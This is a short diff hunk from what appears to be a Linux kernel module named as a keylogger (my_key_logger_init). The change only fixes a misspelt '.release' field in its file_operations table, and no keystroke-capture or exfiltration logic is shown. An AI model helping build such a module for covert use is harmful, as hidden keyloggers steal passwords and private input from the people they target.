@@ -31,7 +31,7 @@ static struct file_operations fops = {
   .open = dev_open,
   .read = dev_read,
   .write = dev_write,
-  .releas = dev_release,
+  .release = dev_release,
 };
 
 static int __init my_key_logger_init(void){
